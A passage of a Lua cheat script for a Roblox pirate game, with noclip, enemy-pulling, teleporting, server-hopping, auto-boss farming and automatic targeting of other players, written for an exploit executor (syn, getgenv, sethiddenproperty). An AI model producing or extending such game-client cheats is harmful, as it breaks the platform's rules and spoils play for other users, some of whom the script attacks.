            while wait() do 
                if NoClip or _G.Kaitun then
                    if syn then
                        setfflag("HumanoidParallelRemoveNoPhysics", "False")
                        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
                        LP.Character.Humanoid:ChangeState(11)
                        if LP.Character:WaitForChild("Humanoid").Sit == true then
                            LP.Character:WaitForChild("Humanoid").Sit = false
                        end
                    else
                        if LP.Character:FindFirstChild("HumanoidRootPart") then
                            if not LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                                if LP.Character:WaitForChild("Humanoid").Sit == true then
                                    LP.Character:WaitForChild("Humanoid").Sit = false
                                end
                                local BodyVelocity = Instance.new("BodyVelocity")
                                BodyVelocity.Name = "BodyVelocity1"
                                BodyVelocity.Parent =  LP.Character.HumanoidRootPart
                                BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
                                BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                            end
                        end
                        for _, v in pairs(LP.Character:GetDescendants()) do
                            if v:IsA("BasePart") then
                                v.CanCollide = false    
                            end
                        end
                    end
                else
                    if LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                        LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1"):Destroy()
                    end
                end
            end
        end)

        -- kaitun mode
        spawn(function()
            while task.wait() do
                pcall(function()
                    if BringMobFarm then
                        if first_sea then 
                            range = 300 
                        end
                        if second_sea then
                            if GetIsLand(LP.Character.HumanoidRootPart.CFrame) == "Ship" then
                                range = 50 
                            else
                                if getgenv().Settings["Auto Rengoku"] then
                                    range = 200
                                else
                                    range = 300
                                end
                            end 
                        end
                        if third_sea then
                            if _G.AutoBones then
                                range = 200
                            else
                                range = 300
                            end
                        end
                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                            if not string.find(v.Humanoid.DisplayName, "Boss") and (v.HumanoidRootPart.Position - LP.Character.HumanoidRootPart.Position).magnitude <= range then
                                if not PosMon then PosMon = v.HumanoidRootPart.CFrame end
                                if InMyNetWork(v.HumanoidRootPart) then
                                    v.HumanoidRootPart.CFrame = PosMon
                                    v.Humanoid.JumpPower = 0
                                    v.Humanoid.WalkSpeed = 0
                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    v.HumanoidRootPart.Transparency = 1
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Head.CanCollide = false
                                    if v.Humanoid:FindFirstChild("Animator") then
                                        v.Humanoid.Animator:Destroy()
                                    end
                                    v.Humanoid:ChangeState(11)
                                    v.Humanoid:ChangeState(14)
                                    sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                end
                            end
                        end
                        PosMon = nil
                    end
                end)
            end
        end)

        local function getDistance(CFrame)
            return (CFrame.Position - LP.Character.HumanoidRootPart.Position).Magnitude
        end

        local function farmSkyGuards()
            pos = CFrame.new(-4716.95703, 853.089722, -1933.925427)
            if getDistance(pos) > 3000 then
                useNearestEntrance(pos)
                wait(.1)
                toPoint(pos)
            else
                toPoint(pos)
            end
            local mobsKilled = 0
            repeat wait()
                local MyLevel = LP.Data.Level.Value
                local QuestC = LP.PlayerGui.Main.Quest
                if MyLevel > 20 then
                    if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                        if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                        end
                    else
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                    end
                end
                if game:GetService("Workspace").Enemies:FindFirstChild("God's Guard") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "God's Guard" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat task.wait()
                                    PosMon = v.HumanoidRootPart.CFrame
                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    v.Head.CanCollide = false
                                    BringMobFarm = true
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.Transparency = 0.9
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                                mobsKilled = 1
                            end
                        end
                    end
                else
                    toPoint(pos * OffsetCFrame())
                end
            until QuestC.Visible == true or mobsKilled == 1
        end
        
        local function isPlayerHunterQuest(Quest) 
            for i,v in pairs(Players:GetChildren()) do
                if string.find(Quest.Container.QuestTitle.Title.Text, v.Name) then
                    return true
                end
            end
            return false
        end
        
        local function teleportToSecondSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
        end

        local function teleportToThirdSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
        end

        local function doSecondSea()
            if game.Workspace.Map.Ice.Door.Transparency == 0 then
                local args = {
                    [1] = "DressrosaQuestProgress",
                    [2] = "Detective"
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                wait(2)
                if LP.Backpack:FindFirstChild("Key") then
                    local tool = LP.Backpack:FindFirstChild("Key")
                    wait(.4)
                    LP.Character.Humanoid:EquipTool(tool)
                    repeat wait()
                        toTarget(game.Workspace.Map.Ice.Door.CFrame)
                        wait(1)
                    until getDistance(game.Workspace.Map.Ice.Door.CFrame) < 10
                    wait(1)
                    if getDistance(game.Workspace.Map.Ice.Door.CFrame) < 5 then
                        repeat wait()
                            local tool = LP.Backpack:FindFirstChild("Key")
                            wait(.4)
                            LP.Character.Humanoid:EquipTool(tool)
                            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
                            wait(1)
                        until game.Workspace.Map.Ice.Door.Transparency == 1 or not LP.Backpack:FindFirstChild("Key")
                    end
                    local entity = 0
                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                            entity = 1
                            repeat task.wait()
                                PosMon = v.HumanoidRootPart.CFrame
                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                v.HumanoidRootPart.CanCollide = false
                                v.Humanoid.WalkSpeed = 0
                                v.Head.CanCollide = false
                                BringMobFarm = true
                                EquipWeapon(_G.SelectWeapon)
                                v.HumanoidRootPart.Transparency = 0.9
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                        end
                    end
                    if not entity then HopServer() end
                    wait(.5)
                    teleportToSecondSea()
                end
            else
                local entity = 0
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                        entity = 1
                        repeat task.wait()
                            PosMon = v.HumanoidRootPart.CFrame
                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.WalkSpeed = 0
                            v.Head.CanCollide = false
                            BringMobFarm = true
                            EquipWeapon(_G.SelectWeapon)
                            v.HumanoidRootPart.Transparency = 0.9
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                        until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                    end
                end
                if not entity then HopServer() end
                
                
                wait(.5)
                teleportToSecondSea()
            end
        end


        wait(0.5)
        game:GetService("GuiService").ErrorMessageChanged:Connect(function(err)
            if _G.Kaitun or _G.AutoRejoinServer then 
                game:GetService("TeleportService"):Teleport(game.PlaceId, LP)
            end
        end)


        _G.KillingPlayer = false

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Auto Rengoku"] and not isWeaponInInventory("Rengoku") then
                        if not LP.Backpack:FindFirstChild("Hidden Key") then
                            if getgenv().Settings["Auto Rengoku Hop"] then
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0 then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                            until not getgenv().Settings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif ReplicatedStorage:FindFirstChild("Awakened Ice Admiral") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0  then
                                    v = ReplicatedStorage:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                            until not getgenv().Settings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                else
                                    HopServer()
                                end
                            else
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                            until not getgenv().Settings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif game.Workspace.Enemies:FindFirstChild("Arctic Warrior") or game.Workspace.Enemies:FindFirstChild("Snow Lurker") then
                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                        if v.Name == "Arctic Warrior" or v.Name == "Snow Lurker" then
                                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    EquipWeapon(_G.SelectWeapon)
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                    v.Humanoid:ChangeState(14)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    RenMon = v.Name
                                                    RenPos = v.HumanoidRootPart.CFrame
                                                until not getgenv().Settings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                            else
                                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                                            end
                                        end
                                    end
                                else
                                    toPoint(CFrame.new(5733.30615234375, 28.366647720336914, -6400.83837890625))
                                end
                            end
                        else
                            toPoint(CFrame.new(6571.9853515625, 297.16973876953125, -6965.3515625))
                        end
                    end
                end)
            end
        end)
        
        

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Auto Kill Darkbeard"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Darkbeard") then
                            v = game.Workspace.Enemies:FindFirstChild("Darkbeard")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().Settings["Auto Kill Darkbeard"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Darkbeard") then
                            v = game.ReplicatedStorage:FindFirstChild("Darkbeard")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            useNearestEntrance(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                            toTarget(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.AutoEctoplasm and second_sea then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.AutoEctoplasm or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            end
                        else
                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Auto Ghoul Race"] and second_sea then
                        if LP.Data.Race.Value ~= "Ghoul" then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            if not isWeaponInInventory("Hellfire Torch") then
                                if game.Workspace.Enemies:FindFirstChild("Cursed Captain") then
                                    v = game.Workspace.Enemies:FindFirstChild("Cursed Captain")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health <= 0 then 
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        else
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                            until not getgenv().Settings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif game.ReplicatedStorage:FindFirstChild("Cursed Captain") then
                                    v = game.ReplicatedStorage:FindFirstChild("Cursed Captain")
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    wait(2)
                                else
                                    if GetMaterial("Ectoplasm") < 100 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                        repeat task.wait()
                                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            BringMobFarm = true
                                                            EquipWeapon(_G.SelectWeapon)
                                                            v.HumanoidRootPart.Transparency = 1
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        until not getgenv().Settings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                                    end
                                                end
                                            end
                                        else
                                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                        end
                                    else
                                        if getgenv().Settings["Auto Ghoul Race Hop"] then HopServer() end
                                    end
                                end
                            elseif GetMaterial("Ectoplasm") < 100 then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat task.wait()
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not getgenv().Settings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                            end
                                        end
                                    end
                                else
                                    useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                    toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                end
                            else
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            end
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Auto Factory"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Core") then
                            v = game.Workspace.Enemies:FindFirstChild("Core")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().Settings["Auto Factory"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Core") then
                            v = game.ReplicatedStorage:FindFirstChild("Core")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().Settings["Auto Factory Hop"] then
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Swan Glasses"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Don Swan") then
                            v = game.Workspace.Enemies:FindFirstChild("Don Swan")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().Settings["Swan Glasses"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Don Swan") then
                            v = game.ReplicatedStorage:FindFirstChild("Don Swan")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().Settings["Swan Glasses Hop"] then
                                if getDistance(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685)) < 40 then
                                    HopServer()
                                else
                                    toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                                end
                            else
                                toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Gravity Cane"] and not isWeaponInInventory("Gravity Cane") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Fajita") then
                            v = game.Workspace.Enemies:FindFirstChild("Fajita")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().Settings["Gravity Cane"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Fajita") then
                            v = game.ReplicatedStorage:FindFirstChild("Fajita")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().Settings["Gravity Cane Hop"] then 
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)
        
        function useNearestEntrance(targetCFrame)
            local entrancesFirstSea = {Vector3.new(61164.19921875, 7.326029300689697, 1856.9254150390625), Vector3.new(-4607.82275390625, 874.3905029296875, -1667.556884765625), Vector3.new(-7894.61767578125, 5547.1416015625, -380.29119873046875)}
            local entrancesSecondSea = {Vector3.new(-287.952209, 306.130615, 605.197021), Vector3.new(-6498.72119, 83.1870193, -134.912308), Vector3.new(919.299927, 125.057106, 32888.207), Vector3.new(2282.219970703125, 34.56594467163086, 885.0680541992188)}
            local entrancesThirdSea = {Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125), Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953), Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125), Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586), Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875), Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)}
            if first_sea then
                entrances = entrancesFirstSea
            end
            if second_sea then
                entrances = entrancesSecondSea
            end
            if third_sea then
                entrances = entrancesThirdSea
            end
            local playerToTargetDistance = (targetCFrame.Position - LP.Character.HumanoidRootPart.CFrame.Position).Magnitude
            local distance = math.huge
            local needEntrance = Vector3.new(0,0,0)
            for i, entrance in pairs(entrances) do
                entranceToTargetDistance = (entrance - targetCFrame.Position).Magnitude
                if entranceToTargetDistance < playerToTargetDistance and entranceToTargetDistance < distance then
                    distance = entranceToTargetDistance
                    needEntrance = entrance
                end
            end
            if needEntrance ~= Vector3.new(0,0,0) then 
                RequestEntrance(needEntrance)
                return true
            else 
                return false 
            end
            return false
        end
        
        function StopTween()
            NoClip = false
            StoppedTween = true
            toTarget(LP.Character.HumanoidRootPart.CFrame)
        end

        function GetMaterial(name)
            for i,v in pairs(ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventory")) do
                if v.Name == name then return v.Count end
            end
            return 0
        end

        function CanIKillThisShit(target)
            if target.Backpack:FindFirstChild("Buddha-Buddha") or target.Backpack:FindFirstChild("Dough-Dough") or target.Backpack:FindFirstChild("Kitsune-Kitsune") then
                return false
            end
            if target.Data.Level.Value < 21 then
                return false
            end
            if target.Character.Health > LP.Data.Stats.Melee.Level.Value * 8 then
                return false
            end
            if target.Character:FindFirstChild("HumanoidRootPart") and getDistance(target.Character.HumanoidRootPart.CFrame) < 100 and LP.PlayerGui.Main.PvpDisabled.Visible and string.find(LP.PlayerGui.Main.PvpDisabled.Text, "Safe Zone") then
                return false
            end
            return true
        end
        
        task.spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    local MyLevel = LP.Data.Level.Value
                    local QuestC = LP.PlayerGui.Main.Quest
                    local Quest = QuestCheck()
                    if _G.AutoFarmLevel then
                        if second_sea or third_sea then
                            if QuestC.Visible == true then
                                if not questStarted then
                                    useNearestEntrance(Quest.QuestGiverPosition)
                                    task.wait(.2)
                                    if getDistance(Quest.QuestGiverPosition) > 10000 then
                                        Bypass(Quest.QuestGiverPosition)
